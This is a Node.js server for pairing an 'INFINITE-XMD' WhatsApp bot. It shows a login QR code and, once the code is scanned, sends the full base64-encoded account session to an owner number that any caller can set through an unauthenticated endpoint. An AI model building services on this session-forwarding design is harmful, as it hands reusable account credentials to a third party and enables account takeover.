const express = require('express');
const path = require('path');
const fs = require('fs').promises;
const { Server } = require('socket.io');
const http = require('http');
const qrcode = require('qrcode');
const { Client, LocalAuth } = require('whatsapp-web.js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let ownerNumber = null;
let currentQR = null;
let client = null;
let isBotReady = false;

// Initialize WhatsApp Client
function initializeWhatsAppBot() {
    client = new Client({
        authStrategy: new LocalAuth({ clientId: "infinite-xmd-pairing" }),
        puppeteer: {
            args: ['--no-sandbox', '--disable-setuid-sandbox'],
            headless: true
        }
    });

    client.on('qr', async (qr) => {
        console.log('🔐 QR code generated');
        currentQR = await qrcode.toDataURL(qr);
        io.emit('qr', currentQR);
    });

    client.on('authenticated', async (session) => {
        console.log('✅ WhatsApp authenticated');
        io.emit('authenticated');
        
        // Send session to owner
        await sendSessionToOwner(session);
    });

    client.on('ready', () => {
        console.log('🤖 WhatsApp client is ready!');
        isBotReady = true;
        io.emit('ready');
    });

    client.on('disconnected', (reason) => {
        console.log('❌ Client disconnected:', reason);
        isBotReady = false;
        // Reinitialize after disconnect
        setTimeout(() => initializeWhatsAppBot(), 5000);
    });

    client.initialize();
}

// Send session to owner's WhatsApp
async function sendSessionToOwner(sessionData) {
    try {
        if (!ownerNumber || !client) {
            console.log('⏳ Owner number not set or client not ready');
            return;
        }

        const base64Session = Buffer.from(JSON.stringify(sessionData)).toString('base64');
        const infinitySession = "INFINITY_" + base64Session;

        const message = `
🤖 *INFINITE-XMD NEW SESSION PAIRED* 🔐

*Session ID:* 
\`\`\`
${infinitySession.substring(0, 50)}...
\`\`\`

*Full Session:* 
\`\`\`
${infinitySession}
\`\`\`

*Timestamp:* ${new Date().toLocaleString()}
*Status:* ✅ Ready to use

💻 Developed by Bevan Society
        `;

        await client.sendMessage(ownerNumber, message);
        console.log('✅ Session sent to owner successfully');

    } catch (error) {
        console.log('❌ Could not send session to owner:', error.message);
    }
}

// API to save owner number
app.post('/api/save-owner', async (req, res) => {
    try {
        const { number } = req.body;
        
        if (!number || !number.endsWith('@c.us')) {
            return res.json({ success: false, message: 'Invalid number format' });
        }
        
        ownerNumber = number;
        await fs.writeFile('owner.json', JSON.stringify({ number }));
        
        console.log('✅ Owner number saved:', number);
        res.json({ success: true, message: 'Number saved successfully' });
        
    } catch (error) {
        res.json({ success: false, message: 'Server error' });
    }
});

// API to get owner number
app.get('/api/get-owner', async (req, res) => {
    try {
        const data = await fs.readFile('owner.json', 'utf8');
        const saved = JSON.parse(data);
        ownerNumber = saved.number;
    } catch (error) {
        // File doesn't exist yet
    }
    res.json({ number: ownerNumber });
});

// API to get bot status
app.get('/api/status', (req, res) => {
    res.json({ 
        isReady: isBotReady,
        hasOwner: !!ownerNumber,
        hasQR: !!currentQR
    });
});

// API to restart pairing
app.post('/api/restart-pairing', (req, res) => {
    if (client) {
        client.destroy();
    }
    initializeWhatsAppBot();
    res.json({ success: true, message: 'Pairing restarted' });
});

// Serve pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/pair', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'pair.html'));
});

app.get('/owner', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'owner.html'));
});

// Initialize when server starts
initializeWhatsAppBot();

server.listen(PORT, () => {
    console.log(`🌐 INFINITE-XMD Pairing Server running on port ${PORT}`);
    console.log('💻 Developed by Bevan Society');
    console.log('📡 WhatsApp bot initialized');
});
